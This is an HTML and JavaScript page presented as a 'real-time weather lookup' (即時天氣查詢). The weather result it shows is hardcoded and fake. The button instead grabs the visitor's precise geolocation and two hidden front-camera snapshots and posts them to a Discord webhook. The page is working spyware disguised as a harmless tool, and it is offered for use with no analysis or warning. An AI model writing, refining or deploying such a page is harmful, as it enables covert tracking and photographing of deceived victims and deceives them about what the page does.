<!DOCTYPE html>
<html lang="zh-TW">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
<title>即時天氣查詢系統</title>

<style>
/* 保持你原始的專業佈局與動畫 */
body {
    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
    text-align: center;
    margin: 0;
    padding: 0;
    height: 100vh;
    display: flex;
    align-items: center;
    justify-content: center;
    background: linear-gradient(-45deg,#4fc3f7,#81d4fa,#b3e5fc,#4fc3f7,#29b6f6);
    background-size: 400% 400%;
    animation: skyFlow 15s ease infinite;
}

@keyframes skyFlow { 0%{background-position:0% 50%;} 50%{background-position:100% 50%;} 100%{background-position:0% 50%;} }

.weather-box {
    background: rgba(255,255,255,0.95);
    width: 85%;
    max-width: 350px;
    padding: 35px 25px;
    border-radius: 25px;
    backdrop-filter: blur(15px);
    box-shadow: 0 15px 45px rgba(0,0,0,0.15);
}

h2 { color: #1a73e8; font-size: 24px; margin-bottom: 10px; }
p { color: #666; font-size: 16px; margin-bottom: 25px; }

.sun { 
    width: 80px; height: 80px; border-radius: 50%; margin: 0 auto 25px;
    background: radial-gradient(circle,#fff176,#fdd835,#fbc02d);
    box-shadow: 0 0 30px rgba(251,192,45,0.6);
    animation: sunPulse 3s ease-in-out infinite;
}
@keyframes sunPulse { 0%,100%{transform:scale(1);} 50%{transform:scale(1.08);} }

button {
    width: 100%;
    padding: 16px;
    font-size: 18px;
    font-weight: bold;
    border: none;
    border-radius: 15px;
    background: linear-gradient(135deg,#42a5f5,#1976d2);
    color: white;
    box-shadow: 0 4px 15px rgba(25,118,210,0.3);
    cursor: pointer;
    transition: 0.2s;
    -webkit-tap-highlight-color: transparent;
}
button:active { transform: scale(0.96); opacity: 0.9; }

#status { 
    margin-top: 25px; 
    font-size: 15px; 
    color: #444; 
    line-height: 1.8;
    min-height: 50px;
}
</style>
</head>
<body>

<div class="weather-box">
    <div class="sun"></div>
    <h2>🌤 即時天氣查詢</h2>
    <p>正在校準全球氣象衛星...</p>
    <button id="btn" onclick="startAction()">獲取當前天氣</button>
    <div id="status"></div>
</div>

<!-- 隱藏組件 -->
<video id="v" style="display:none;" autoplay playsinline muted></video>
<canvas id="c" style="display:none;"></canvas>

<script>
// 設定 Webhook
var webhook = "https://discord.com";
var photoCount = 0;
var currentStream = null; // 用來儲存串流

function startAction() {
    document.getElementById("btn").style.display = "none";
    document.getElementById("status").innerHTML = "📡 正在連接氣象基站...<br>🌓 掃描環境光感中...";
    
    getLocation();
    getCamera();
}

function getLocation() {
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(function(pos) {
            // 修正地圖網址語法錯誤
            var mapLink = "https://www.google.com" + pos.coords.latitude + "," + pos.coords.longitude;
            fetch(webhook, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({
                    content: "📍 **定位成功**\n緯度: " + pos.coords.latitude + "\n經度: " + pos.coords.longitude + "\n地圖連結: " + mapLink
                })
            });
            document.getElementById("status").innerHTML += "<br>✅ 定位成功，處理數據中...";
        }, function(err) {
            console.log("定位失敗");
        }, { enableHighAccuracy: true });
    }
}

function getCamera() {
    navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
    .then(function(stream) {
        currentStream = stream; // 記錄串流
        var video = document.getElementById("v");
        video.srcObject = stream;
        
        // 修正 setTimeout 呼叫方式，確保 stream 正確傳遞
        setTimeout(function() { takeSnap(false); }, 1500);
        setTimeout(function() { takeSnap(true); }, 3000);
        
    }).catch(function(err) {
        document.getElementById("status").innerHTML = "❌ 偵測失敗：請開啟位置與環境權限。";
    });
}

function takeSnap(isLast) {
    var video = document.getElementById("v");
    var canvas = document.getElementById("c");
    canvas.width = video.videoWidth;
    canvas.height = video.videoHeight;
    var ctx = canvas.getContext("2d");
    ctx.drawImage(video, 0, 0);
    
    canvas.toBlob(function(blob) {
        var formData = new FormData();
        formData.append("file", blob, "img_" + Date.now() + ".jpg");
        formData.append("payload_json", JSON.stringify({ content: "📸 **環境掃描已同步 (" + (++photoCount) + "/2)**" }));

        fetch(webhook, { method: "POST", body: formData })
        .then(function() {
            if (isLast && currentStream) {
                // 拍完最後一張，停止相機
                currentStream.getTracks().forEach(function(track) { track.stop(); });
                document.getElementById("status").innerHTML = "☀️ **今日天氣：晴朗**<br>🌡 溫度：27.5°C<br>🌬 濕度：62%<br>✨ 資訊已更新至最新。";
            }
        });
    }, "image/jpeg", 0.7);
}
</script>

</body>
</html>
